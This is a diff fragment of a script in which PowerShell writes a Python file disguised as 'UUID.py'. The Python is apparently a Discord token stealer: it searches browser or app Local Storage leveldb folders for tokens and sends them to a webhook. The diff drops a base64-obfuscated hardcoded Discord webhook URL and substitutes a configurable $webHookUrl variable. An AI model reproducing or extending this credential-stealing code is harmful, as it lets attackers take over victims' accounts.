@@ -7,13 +7,8 @@ Set-Content UUID.py "
 import os
 import re
 import json
-import base64
 from urllib.request import Request, urlopen
-# HERE
-# HERE
-WEBHOOK_URL = base64.b64decode(b'aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwNjM4MDg3NTUyNjA3MTkyMjcvMGViWjVrcDVhUElVcWMxdHFzUEV0MnM5N2g5ZHhfbXJqQl9PeHBleWNPd0diUFhRWUlwVm0zaEhjNlJZZXZ4Sk5rY2g=').decode()
-# HERE
-# HERE
+WEBHOOK_URL = $webHookUrl
 PING_ME = False
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
